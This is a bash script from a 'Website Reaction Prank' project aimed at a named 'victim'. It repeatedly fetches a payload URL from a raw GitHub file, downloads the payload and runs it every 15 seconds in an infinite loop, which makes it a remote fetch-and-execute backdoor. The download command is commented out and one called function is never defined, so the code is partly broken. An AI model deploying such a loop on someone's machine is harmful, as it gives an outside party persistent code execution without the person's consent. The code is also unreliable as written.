#!/usr/bin/env bash
# Download and run a script from a prepspecified location.

SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )

###################################################################
 # Configuration variables
payloadURL="https://raw.githubusercontent.com/thiesgehrmann/arduinoPranks/master/websiteReactionPrank/victims/michael/scriptloc.txt"

localPayloadLoc="$SCRIPTDIR/payload"
localPayloadDate="$SCRIPTDIR/payload.date"
localPayloadURL="$SCRIPTDIR/payload.url"

###################################################################

# Remove the payload and local values

rm -rf "$localPayloadLoc" "$localPayloadDate" "$localPayloadURL"
touch "$localPayloadLoc"
touch "$localPayloadDate"
touch "$localPayloadURL"

###################################################################

function getURLDate(){
  local url="$1"
  curl -s -I "$url" \
   | grep '^Date'
}

function getPayloadURL(){
  local url="$1"
  curl -s "$url" \
   | grep -v -e '^#' -e'^$' \
   | head -n1
}

function downloadURL(){
  local url="$1"
  local outfile="$2"
  #wget -O "$2" "$1"
}

function downloadPayloadIfNeeded(){

  local url=`getPayloadURL "$payloadURL"`
  local localURL=`cat "$localPayloadURL"`
  local urlDate=`getURLDate "$url"`



    # We have a totally new URL, we should get it no matter what!
  if [ "$url" != "$localURL" ]; then
    echo "We have a new URL!"
    downloadURL "$url" "$localPayloadLoc"
    echo "$url" > "$localPayloadURL"
    echo "$urlDate" > "$localPayloadDate"

  else
    echo "Same URL"
    local localDate=`cat "$localPayloadDate"`

    if [ "$localDate" != "$urlDate" ]; then
      echo "The payload has been updated!"
      downloadURL "$url" "$localPayloadLoc"
      local urlDate=`getPayloadDate "$url"`
    fi
  fi

}

function runPayload() {
  "$localPayloadLoc"
}

###################################################################

echo "#################################"
echo "# Website Reaction Prank        #"
echo "#################################"

while [ true ]; do

  downloadPayloadIfNeeded

  runPayload

  sleep 15

done
